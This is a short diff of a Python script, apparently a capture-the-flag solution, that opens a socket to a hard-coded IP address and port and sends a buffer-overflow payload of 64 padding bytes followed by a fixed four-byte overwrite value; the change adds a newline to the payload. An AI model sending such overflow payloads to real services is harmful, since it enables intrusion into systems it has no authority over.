@@ -4,7 +4,7 @@ import socket
 
 HOST = "104.236.80.67"
 PORT = 5681
-Payload = "A"*64 + "\x37\x13\x37\x13"
+Payload = "A"*64 + "\x37\x13\x37\x13\n"
 
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
